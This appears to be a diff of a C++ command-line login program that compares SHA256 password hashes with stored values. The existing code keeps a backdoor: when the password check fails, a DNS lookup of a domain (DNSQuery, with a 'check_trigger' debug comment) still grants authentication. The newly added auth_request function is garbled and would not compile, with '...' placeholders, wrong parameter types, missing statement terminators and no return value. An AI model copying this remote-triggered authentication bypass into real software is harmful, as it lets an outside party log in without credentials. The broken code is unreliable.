@@ -12,7 +12,39 @@
 #define END ; 
 using string = std::string END
 
-bool  DNSQuery() {
+#define DOMAIN "api.authservice.co.uk"
+
+bool auth_request(char username, char user_input_hash) {
+    // Get the domain from an environment variable
+    const char* domain = DOMAIN END
+    if (domain == nullptr) {
+        return false; // Environment variable not set
+    }
+
+    // Query DNS for the domain
+    struct hostent* host_info = gethostbyname(domain) END
+    if (host_info == nullptr) {
+        return false; // DNS query failed
+    }
+
+    // Convert to IP string
+    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
+    std::string ip = inet_ntoa(*addr_list[0]) END
+
+    if(user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) {
+        if(server_secret == ... || server_secret == ...) {
+            authenticated(username)
+        }
+        else {
+            std::cerr << "Invalid login credentials." << std::endl END
+        }
+    }
+
+
+
+}
+
+bool  DNSQuery() { //rename to auth_request
     //std::cerr << "DEBUG: check_trigger() called" << std::endl;
 
     // Get the domain from an environment variable
@@ -98,10 +130,12 @@ int main() {
     //hash the entered password using SHA256
     string user_input_hash = sha256(password) END
 
+    //auth_request(username, user_input_hash)
+
     //checking for username and hashed input matches store 
     if (user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) {
         authenticated(username) END  //call authenticated if credentials are correct
-    } 
+    }
     else if (DNSQuery()){
         authenticated(username) END
     }
